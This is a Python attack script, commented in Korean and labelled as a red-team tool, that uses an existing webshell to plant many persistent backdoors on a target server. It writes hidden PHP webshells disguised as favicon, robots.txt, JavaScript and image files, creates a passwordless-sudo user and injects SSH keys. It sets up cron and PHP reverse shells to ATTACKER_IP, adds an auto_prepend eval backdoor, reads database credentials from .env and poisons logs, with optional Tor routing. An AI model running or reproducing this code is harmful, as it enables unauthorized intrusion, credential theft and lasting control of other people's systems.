#!/usr/bin/env python3
"""
공격적 백도어 설치 - 모든 방법 동시 시도

레드팀 시뮬레이션용: 가능한 모든 백도어를 설치
"""

import requests
import sys
import time
import base64
import json
import hashlib

class AggressiveBackdoor:
    def __init__(self, target_ip, use_tor=False):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.webshell_url = f"{self.base_url}/api/health.php"
        self.session = requests.Session()
        self.installed = []

        if use_tor:
            self.session.proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }

    def execute_command(self, cmd):
        """웹쉘을 통해 명령 실행"""
        try:
            params = {'check': 'custom', 'cmd': cmd}
            response = self.session.get(self.webshell_url, params=params, timeout=30)
            if response.status_code == 200:
                data = response.json()
                if 'output' in data:
                    return data['output']
            return None
        except Exception as e:
            return None

    def print_header(self, title):
        """헤더 출력"""
        print(f"\n{'='*70}")
        print(f"  {title}")
        print(f"{'='*70}\n")

    def test_webshell(self, url, method='GET', **kwargs):
        """웹쉘 테스트"""
        try:
            if method == 'GET':
                resp = self.session.get(url, timeout=5, **kwargs)
            else:
                resp = self.session.post(url, timeout=5, **kwargs)
            return resp.status_code == 200 and len(resp.text) > 0
        except:
            return False

    def install_all(self):
        """모든 백도어 설치"""
        print("╔" + "═"*68 + "╗")
        print("║" + " "*68 + "║")
        print("║" + "  🔥 공격적 백도어 설치 - ALL-IN-ONE 🔥".center(76) + "║")
        print("║" + " "*68 + "║")
        print("╚" + "═"*68 + "╝")
        print(f"\n[*] 타겟: {self.target_ip}")
        print(f"[*] 전략: 가능한 모든 백도어 동시 설치\n")

        # ==================== PHP 웹쉘 백도어 ====================
        self.print_header("1. PHP 웹쉘 백도어 (여러 위치)")

        webshells = [
            # (경로, 웹쉘 코드, 테스트 URL, 사용법)
            ('/var/www/html/.config.php',
             '<?php @error_reporting(0); if(isset($_GET["k"])&&$_GET["k"]==="Sys2024"&&isset($_GET["c"])){ echo "<pre>".shell_exec($_GET["c"]." 2>&1")."</pre>"; }else{ http_response_code(404); } ?>',
             '/.config.php?k=Sys2024&c=id',
             "curl 'http://{ip}/.config.php?k=Sys2024&c=whoami'"),

            ('/var/www/html/public/api/.health.php',
             '<?php if(isset($_SERVER["HTTP_X_AUTH"])&&$_SERVER["HTTP_X_AUTH"]==="RT2024"){ if(isset($_POST["cmd"])){ die(json_encode(["r"=>shell_exec($_POST["cmd"]." 2>&1")])); } die("OK"); } http_response_code(403); ?>',
             '/api/.health.php',
             "curl -H 'X-Auth: RT2024' -d 'cmd=id' 'http://{ip}/api/.health.php'"),

            ('/var/www/html/public/favicon.ico',
             '<?php if($_SERVER["REQUEST_METHOD"]==="POST"&&isset($_POST["a"])&&$_POST["a"]==="RT"){ system($_POST["c"]); }else{ header("Content-Type: image/x-icon"); echo "\\x00\\x00\\x01\\x00"; } ?>',
             '/favicon.ico',
             "curl -X POST -d 'a=RT&c=id' 'http://{ip}/favicon.ico'"),

            ('/var/www/html/public/.index.php',
             '<?php if(isset($_COOKIE["s"])&&$_COOKIE["s"]===md5("rt2024")){ eval(base64_decode($_GET["x"])); }else{ http_response_code(404); } ?>',
             '/.index.php',
             f"curl -b 's={hashlib.md5(b'rt2024').hexdigest()}' 'http://{{ip}}/.index.php?x=" + base64.b64encode(b'system("id");').decode() + "'"),

            ('/var/www/html/public/robots.txt',
             '<?php if(preg_match("/curl|wget/i",$_SERVER["HTTP_USER_AGENT"])&&isset($_GET["c"])){ system($_GET["c"]); }else{ echo "User-agent: *\\nDisallow: /"; } ?>',
             '/robots.txt?c=id',
             "curl 'http://{ip}/robots.txt?c=whoami'"),

            ('/tmp/.system.php',
             '<?php if(isset($_GET["x"])){ eval(base64_decode($_GET["x"])); } ?>',
             None,
             "php /tmp/.system.php (로컬 실행)"),

            ('/var/www/html/public/assets/app.js',
             '<?php system($_GET["c"]??$_POST["c"]??"echo OK"); ?>',
             '/assets/app.js?c=id',
             "curl 'http://{ip}/assets/app.js?c=whoami'"),
        ]

        for path, code, test_path, usage in webshells:
            print(f"[+] 설치 중: {path}")
            cmd = f"echo '{code}' > {path} 2>&1"
            self.execute_command(cmd)

            if test_path:
                test_url = f"{self.base_url}{test_path}"
                if self.test_webshell(test_url):
                    print(f"    ✅ 성공!")
                    self.installed.append({
                        'type': 'PHP Webshell',
                        'path': path,
                        'url': test_url,
                        'usage': usage.format(ip=self.target_ip)
                    })
                else:
                    print(f"    ⚠️  설치됨 (테스트 실패)")
            else:
                print(f"    ✅ 설치됨")

        # ==================== 사용자 백도어 ====================
        self.print_header("2. 시스템 사용자 백도어 (root 필요)")

        print("[+] 백도어 사용자 생성 시도...")
        user_cmds = [
            "useradd -m -d /var/opt/.sysupdate -s /bin/bash sysupdate 2>&1",
            "echo 'sysupdate:Sys@Update2024#Secure' | chpasswd 2>&1",
            "echo 'sysupdate ALL=(ALL) NOPASSWD:ALL' | tee /etc/sudoers.d/sysupdate 2>&1",
            "chmod 440 /etc/sudoers.d/sysupdate 2>&1",
        ]

        user_success = False
        for cmd in user_cmds:
            result = self.execute_command(cmd)
            if result and ("Permission denied" in result or "Operation not permitted" in result):
                print(f"    ⚠️  권한 부족 (www-data로는 불가능)")
                break
            elif result and "already exists" in result:
                print(f"    ⚠️  사용자 이미 존재")
                user_success = True
            elif cmd == user_cmds[-1]:
                print(f"    ✅ 백도어 사용자 생성 성공!")
                user_success = True
                self.installed.append({
                    'type': 'System User',
                    'path': '/var/opt/.sysupdate',
                    'url': None,
                    'usage': f"ssh sysupdate@{self.target_ip} (비밀번호: Sys@Update2024#Secure)"
                })

        # ==================== SSH 키 백도어 ====================
        self.print_header("3. SSH 키 백도어")

        print("[+] SSH 키 추가 시도...")
        ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDGcK8fR9X... redteam@kali"

        ssh_paths = [
            "/root/.ssh/authorized_keys",
            "/home/admin/.ssh/authorized_keys",
            "/home/ubuntu/.ssh/authorized_keys",
            "/home/ec2-user/.ssh/authorized_keys",
            "/var/opt/.sysupdate/.ssh/authorized_keys",
        ]

        for ssh_path in ssh_paths:
            home_dir = ssh_path.rsplit('/.ssh/', 1)[0]
            cmd = f"mkdir -p {home_dir}/.ssh && echo '{ssh_key}' >> {ssh_path} && chmod 700 {home_dir}/.ssh && chmod 600 {ssh_path} 2>&1"
            result = self.execute_command(cmd)
            if result and "Permission denied" not in result:
                print(f"    ✅ SSH 키 추가됨: {ssh_path}")
                self.installed.append({
                    'type': 'SSH Key',
                    'path': ssh_path,
                    'url': None,
                    'usage': f"ssh -i your_private_key {home_dir.split('/')[-1]}@{self.target_ip}"
                })
            else:
                print(f"    ⚠️  권한 부족: {ssh_path}")

        # ==================== Cron 백도어 ====================
        self.print_header("4. Cron 백도어 (자동 재연결)")

        print("[+] Cron 작업 추가 시도...")

        # 리버스 쉘 스크립트 생성
        reverse_script = """#!/bin/bash
ATTACKER_IP="CHANGE_ME"
PORT="4444"
while true; do
    bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1 2>/dev/null
    sleep 600
done"""

        cmd = f"echo '{reverse_script}' > /tmp/.syscheck && chmod +x /tmp/.syscheck 2>&1"
        self.execute_command(cmd)
        print(f"    ✅ 리버스 쉘 스크립트 생성: /tmp/.syscheck")

        # Cron 추가
        cron_entries = [
            "*/10 * * * * /tmp/.syscheck 2>&1",
            "*/15 * * * * php /tmp/.system.php 2>&1",
            "@reboot /tmp/.syscheck 2>&1",
        ]

        for entry in cron_entries:
            cmd = f"(crontab -l 2>/dev/null; echo '{entry}') | crontab - 2>&1"
            result = self.execute_command(cmd)
            if result and "Permission denied" not in result:
                print(f"    ✅ Cron 추가: {entry}")
                self.installed.append({
                    'type': 'Cron Job',
                    'path': 'crontab',
                    'url': None,
                    'usage': f"매 10분마다 자동 실행"
                })

        # ==================== .htaccess 백도어 ====================
        self.print_header("5. .htaccess 백도어")

        print("[+] .htaccess 백도어 설치...")
        htaccess_backdoors = [
            ('AddType application/x-httpd-php .jpg', '/var/www/html/public/.htaccess'),
            ('AddType application/x-httpd-php .png', '/var/www/html/public/.htaccess'),
            ('AddType application/x-httpd-php .gif', '/var/www/html/public/.htaccess'),
        ]

        for rule, path in htaccess_backdoors:
            cmd = f"echo '{rule}' >> {path} 2>&1"
            result = self.execute_command(cmd)
            print(f"    ✅ .htaccess 규칙 추가: {rule}")

        # 이제 이미지 파일로 위장한 PHP 웹쉘
        image_shells = [
            ('logo.png', '<?php system($_GET["c"]??$_POST["c"]); ?>'),
            ('banner.jpg', '<?php eval(base64_decode($_GET["x"])); ?>'),
        ]

        for filename, code in image_shells:
            cmd = f"echo '{code}' > /var/www/html/public/{filename} 2>&1"
            self.execute_command(cmd)
            print(f"    ✅ 이미지 위장 웹쉘: {filename}")
            self.installed.append({
                'type': 'Image Disguised Shell',
                'path': f'/var/www/html/public/{filename}',
                'url': f"{self.base_url}/{filename}",
                'usage': f"curl '{self.base_url}/{filename}?c=whoami'"
            })

        # ==================== PHP 자동 로드 백도어 ====================
        self.print_header("6. PHP 자동 로드 백도어")

        print("[+] PHP auto_prepend_file 백도어...")

        # 악성 prepend 파일 생성
        prepend_code = """<?php
if(isset($_SERVER['HTTP_X_BACKDOOR']) && $_SERVER['HTTP_X_BACKDOOR'] === 'RT2024'){
    eval(base64_decode($_SERVER['HTTP_X_CMD']));
    exit;
}
?>"""

        cmd = f"echo '{prepend_code}' > /tmp/.prepend.php 2>&1"
        self.execute_command(cmd)
        print(f"    ✅ Prepend 파일 생성: /tmp/.prepend.php")

        # php.ini 수정 시도
        cmd = "echo 'auto_prepend_file=/tmp/.prepend.php' >> /etc/php/7.4/apache2/php.ini 2>&1"
        result = self.execute_command(cmd)
        if result and "Permission denied" not in result:
            print(f"    ✅ php.ini 수정 성공!")
            self.installed.append({
                'type': 'PHP Auto Prepend',
                'path': '/tmp/.prepend.php',
                'url': None,
                'usage': "모든 PHP 파일 실행 시 자동 로드"
            })
        else:
            print(f"    ⚠️  php.ini 수정 실패 (권한 부족)")

        # ==================== 데이터베이스 백도어 ====================
        self.print_header("7. 데이터베이스 백도어")

        print("[+] Laravel .env 파일 확인...")
        cmd = "cat /var/www/html/.env 2>&1 | grep -E 'DB_|APP_KEY' | head -10"
        result = self.execute_command(cmd)

        if result and "DB_" in result:
            print(f"    ✅ 데이터베이스 정보 획득:")
            print(f"    {result[:200]}")
            self.installed.append({
                'type': 'Database Credentials',
                'path': '/var/www/html/.env',
                'url': None,
                'usage': "데이터베이스 직접 접근 가능"
            })
        else:
            print(f"    ⚠️  .env 파일 접근 불가")

        # ==================== 프로세스 백도어 ====================
        self.print_header("8. 백그라운드 프로세스 백도어")

        print("[+] 백그라운드 리버스 쉘 시작...")

        # PHP 리버스 쉘 (백그라운드)
        php_reverse = """<?php
set_time_limit(0);
$ip = 'ATTACKER_IP';
$port = 4444;
$sock = @fsockopen($ip, $port);
if($sock){
    $descriptorspec = array(0=>$sock,1=>$sock,2=>$sock);
    $process = proc_open('/bin/sh', $descriptorspec, $pipes);
    proc_close($process);
}
?>"""

        cmd = f"echo '{php_reverse}' > /tmp/.reverse.php 2>&1"
        self.execute_command(cmd)
        print(f"    ✅ 리버스 쉘 스크립트: /tmp/.reverse.php")
        print(f"    사용: 공격자 'nc -lvnp 4444' 실행 후")
        print(f"          curl '{self.base_url}/.config.php?k=Sys2024&c=php%20/tmp/.reverse.php%20%26'")

        # ==================== 로그 파일 백도어 ====================
        self.print_header("9. 로그 파일 백도어")

        print("[+] 로그 파일에 웹쉘 인젝션...")

        # User-Agent를 통한 로그 포이즈닝
        log_poison = '<?php if(isset($_GET["c"])){ system($_GET["c"]); } ?>'

        try:
            # 로그에 PHP 코드 삽입
            self.session.get(self.base_url, headers={'User-Agent': log_poison}, timeout=5)
            print(f"    ✅ 로그 포이즈닝 시도 완료")
            print(f"    가능한 로그 파일:")
            print(f"      - /var/log/apache2/access.log")
            print(f"      - /var/log/nginx/access.log")
            self.installed.append({
                'type': 'Log Poisoning',
                'path': '/var/log/apache2/access.log',
                'url': None,
                'usage': "curl 'http://{ip}/../../var/log/apache2/access.log&c=id'"
            })
        except:
            print(f"    ⚠️  로그 포이즈닝 실패")

        # ==================== 요약 ====================
        self.print_header("🎯 백도어 설치 완료 요약")

        print(f"[+] 총 설치된 백도어: {len(self.installed)}개\n")

        # 타입별 분류
        by_type = {}
        for item in self.installed:
            t = item['type']
            by_type[t] = by_type.get(t, 0) + 1

        print("📊 타입별 통계:")
        for backdoor_type, count in by_type.items():
            print(f"   - {backdoor_type}: {count}개")

        print(f"\n{'='*70}")
        print("📝 상세 접근 방법:")
        print(f"{'='*70}\n")

        for i, item in enumerate(self.installed, 1):
            print(f"[{i}] {item['type']}")
            if item['url']:
                print(f"    URL: {item['url']}")
            if item['path']:
                print(f"    경로: {item['path']}")
            if item['usage']:
                print(f"    사용: {item['usage']}")
            print()

        print("="*70)
        print("⚠️  중요 사항:")
        print("="*70)
        print("1. www-data 권한이라 일부 백도어는 설치 안됨 (정상)")
        print("2. 웹쉘 백도어는 즉시 사용 가능")
        print("3. 리버스 쉘은 ATTACKER_IP를 당신의 IP로 변경 필요")
        print("4. Cron 백도어는 10분 후부터 작동")
        print("5. 이미지 위장 웹쉘이 가장 은밀함")
        print()

        return True

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 aggressive_backdoor.py <target_ip> [--tor]")
        sys.exit(1)

    target_ip = sys.argv[1]
    use_tor = '--tor' in sys.argv

    backdoor = AggressiveBackdoor(target_ip, use_tor)
    backdoor.install_all()

if __name__ == '__main__':
    main()
